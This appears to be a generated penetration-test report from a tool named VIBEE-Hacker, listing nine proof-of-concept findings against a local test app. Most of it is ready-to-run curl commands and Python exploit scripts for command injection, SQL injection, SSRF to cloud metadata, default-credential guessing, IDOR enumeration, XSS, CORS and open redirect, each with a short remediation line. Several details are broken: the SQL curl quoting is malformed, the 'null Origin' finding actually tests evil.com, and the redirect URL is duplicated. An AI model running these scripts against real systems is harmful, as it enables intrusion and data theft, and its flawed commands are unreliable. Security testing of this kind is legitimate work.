# VIBEE-Hacker — PoC Report

**Total PoCs:** 9

---

## 1. Command Injection in parameter 'q'

# PoC: Command Injection in parameter 'q'
**Type:** cmdi | **Severity:** CRITICAL

## Description
Command Injection allows execution of arbitrary OS commands on the server.

## Impact
Full server compromise, data exfiltration, lateral movement, ransomware deployment.

## Reproduce (curl)
```bash
curl -s 'http://127.0.0.1:5555/search?q=test' --data-urlencode 'q=; id'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/search?q=test"
PARAM = "q"
PAYLOAD = "; id"

resp = httpx.get(TARGET, params={PARAM: PAYLOAD})
if any(m in resp.text for m in ["uid=", "root:", "www-data"]):
    print(f"[!] Command Injection confirmed!")
    print(f"    Output: {resp.text[:300]}")
else:
    print("[-] Command injection not confirmed")

```

## Raw HTTP Request
```http
GET /search?q=test HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Use subprocess with list arguments (never shell=True). Validate/sanitize all input.
---

## 2. Default credentials work on /login

# PoC: Default credentials work on /login
**Type:** default_creds | **Severity:** CRITICAL

## Description
Default credentials allow unauthorized access to admin panels.

## Impact
Full administrative access, complete application compromise.

## Reproduce (curl)
```bash
curl -s -X POST 'http://127.0.0.1:5555/login' -d 'username=admin&password=admin'
```

## Exploit Script (Python)
```python
import httpx

LOGIN_URL = "http://127.0.0.1:5555/login"
CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("admin", "123456"),
]

for username, password in CREDS:
    resp = httpx.post(LOGIN_URL, data={"username": username, "password": password})
    if resp.status_code == 200 and any(m in resp.text.lower() for m in ["dashboard", "welcome", "logout"]):
        print(f"[!] Default creds work: {username}:{password}")
        break
else:
    print("[-] No default credentials found")

```

## Raw HTTP Request
```http
GET /login HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Change default credentials immediately. Implement account lockout and MFA.
---

## 3. SQL Injection in parameter 'q'

# PoC: SQL Injection in parameter 'q'
**Type:** sqli | **Severity:** CRITICAL

## Description
SQL Injection allows an attacker to manipulate database queries by injecting SQL code through user input.

## Impact
Data exfiltration, authentication bypass, data modification, and potential remote code execution via database features.

## Reproduce (curl)
```bash
curl -s 'http://127.0.0.1:5555/search?q=test' --data-urlencode 'q=' OR '1'='1' --'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/search?q=test"
PARAM = "q"
PAYLOAD = "' OR '1'='1' --"

resp = httpx.get(TARGET, params={PARAM: PAYLOAD})
if "SQL" in resp.text or "error" in resp.text.lower():
    print(f"[!] SQLi confirmed: {PARAM}={PAYLOAD}")
    print(f"    Status: {resp.status_code}")
    print(f"    Evidence: {resp.text[:200]}")
else:
    print("[-] Not vulnerable or different response")

```

## Raw HTTP Request
```http
GET /search?q=test HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Use parameterized queries/prepared statements. Never concatenate user input into SQL strings.
---

## 4. SSRF in parameter 'q'

# PoC: SSRF in parameter 'q'
**Type:** ssrf | **Severity:** CRITICAL

## Description
Server-Side Request Forgery allows the attacker to make the server send requests to internal resources.

## Impact
Internal network scanning, cloud metadata access (AWS/GCP keys), internal service exploitation.

## Reproduce (curl)
```bash
curl -s 'http://127.0.0.1:5555/search?q=test' --data-urlencode 'q=http://169.254.169.254/latest/meta-data/'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/search?q=test"
PARAM = "q"
PAYLOAD = "http://169.254.169.254/latest/meta-data/"

resp = httpx.get(TARGET, params={PARAM: PAYLOAD})
if resp.status_code == 200 and len(resp.text) > 0:
    print(f"[!] SSRF confirmed: server fetched internal resource")
    print(f"    Response length: {len(resp.text)}")
    print(f"    Content: {resp.text[:300]}")

```

## Raw HTTP Request
```http
GET /search?q=test HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Validate and allowlist URLs. Block internal IP ranges. Use a URL parser, not regex.
---

## 5. CORS: Arbitrary Origin reflected

# PoC: CORS: Arbitrary Origin reflected
**Type:** cors | **Severity:** HIGH

## Description
CORS misconfiguration allows malicious websites to read responses from the target API.

## Impact
Sensitive data theft from authenticated users via malicious websites.

## Reproduce (curl)
```bash
curl -s -H 'Origin: https://evil.com' -I 'http://127.0.0.1:5555/api/data'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/api/data"
EVIL_ORIGIN = "https://evil.com"

resp = httpx.get(TARGET, headers={"Origin": EVIL_ORIGIN})
acao = resp.headers.get("Access-Control-Allow-Origin", "")
acac = resp.headers.get("Access-Control-Allow-Credentials", "")

if acao == EVIL_ORIGIN or acao == "*":
    print(f"[!] CORS misconfiguration confirmed!")
    print(f"    ACAO: {acao}")
    print(f"    ACAC: {acac}")
    if acac.lower() == "true":
        print("    [!!] Credentials allowed — HIGH severity")

```

## Raw HTTP Request
```http
GET /api/data HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Restrict Access-Control-Allow-Origin to specific trusted domains. Never reflect Origin.
---

## 6. BOLA/IDOR — Insecure Direct Object Reference

# PoC: BOLA/IDOR — Insecure Direct Object Reference
**Type:** idor | **Severity:** HIGH

## Description
Insecure Direct Object Reference allows accessing other users' data by manipulating object IDs.

## Impact
Unauthorized data access, privacy violation, data breach.

## Reproduce (curl)
```bash
curl -s 'http://127.0.0.1:5555/profile/1'
```

## Exploit Script (Python)
```python
import httpx

BASE_URL = "http://127.0.0.1:5555/profile/1"

# Enumerate IDs
for user_id in range(1, 20):
    url = BASE_URL.replace("1", str(user_id))
    resp = httpx.get(url)
    if resp.status_code == 200:
        print(f"[!] Accessible: ID={user_id} -> {resp.text[:100]}")

```

## Raw HTTP Request
```http
GET /profile/1 HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Implement server-side authorization checks. Use indirect references (UUIDs).
---

## 7. Reflected XSS in parameter 'q'

# PoC: Reflected XSS in parameter 'q'
**Type:** xss | **Severity:** HIGH

## Description
Cross-Site Scripting (XSS) allows injection of malicious scripts into web pages viewed by other users.

## Impact
Session hijacking, credential theft, defacement, malware distribution, and phishing.

## Reproduce (curl)
```bash
curl -s 'http://127.0.0.1:5555/search?q=test' --data-urlencode 'q=<script>alert(document.domain)</script>'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/search?q=test"
PARAM = "q"
PAYLOAD = "<script>alert(document.domain)</script>"

resp = httpx.get(TARGET, params={PARAM: PAYLOAD})
if PAYLOAD in resp.text:
    print(f"[!] XSS confirmed: payload reflected in response")
    print(f"    URL: {TARGET}?{PARAM}={PAYLOAD}")
else:
    print("[-] Payload not reflected")

```

## Raw HTTP Request
```http
GET /search?q=test HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Encode output, implement Content-Security-Policy, use HttpOnly cookies.
---

## 8. CORS: null Origin allowed

# PoC: CORS: null Origin allowed
**Type:** cors | **Severity:** MEDIUM

## Description
CORS misconfiguration allows malicious websites to read responses from the target API.

## Impact
Sensitive data theft from authenticated users via malicious websites.

## Reproduce (curl)
```bash
curl -s -H 'Origin: https://evil.com' -I 'http://127.0.0.1:5555/api/data'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/api/data"
EVIL_ORIGIN = "https://evil.com"

resp = httpx.get(TARGET, headers={"Origin": EVIL_ORIGIN})
acao = resp.headers.get("Access-Control-Allow-Origin", "")
acac = resp.headers.get("Access-Control-Allow-Credentials", "")

if acao == EVIL_ORIGIN or acao == "*":
    print(f"[!] CORS misconfiguration confirmed!")
    print(f"    ACAO: {acao}")
    print(f"    ACAC: {acac}")
    if acac.lower() == "true":
        print("    [!!] Credentials allowed — HIGH severity")

```

## Raw HTTP Request
```http
GET /api/data HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Restrict Access-Control-Allow-Origin to specific trusted domains. Never reflect Origin.
---

## 9. Open redirect via parameter 'url' at /redirect

# PoC: Open redirect via parameter 'url' at /redirect
**Type:** open_redirect | **Severity:** MEDIUM

## Description
Open Redirect allows redirecting users to malicious websites via a trusted domain.

## Impact
Phishing, OAuth token theft, reputation damage.

## Reproduce (curl)
```bash
curl -s -I 'http://127.0.0.1:5555/redirect?url=https://evil.com?url=https://evil.com'
```

## Exploit Script (Python)
```python
import httpx

TARGET = "http://127.0.0.1:5555/redirect?url=https://evil.com"
PARAM = "url"
EVIL_URL = "https://evil.com"

resp = httpx.get(TARGET, params={PARAM: EVIL_URL}, follow_redirects=False)
location = resp.headers.get("Location", "")

if "evil.com" in location:
    print(f"[!] Open redirect confirmed!")
    print(f"    Location: {location}")
else:
    print(f"[-] No redirect to evil.com (Location: {location})")

```

## Raw HTTP Request
```http
GET /redirect?url=https://evil.com HTTP/1.1
Host: 127.0.0.1:5555
User-Agent: VIBEE-Hacker/2.2.0
Accept: */*


```

## Remediation
Validate redirect URLs against an allowlist. Don't allow external redirects.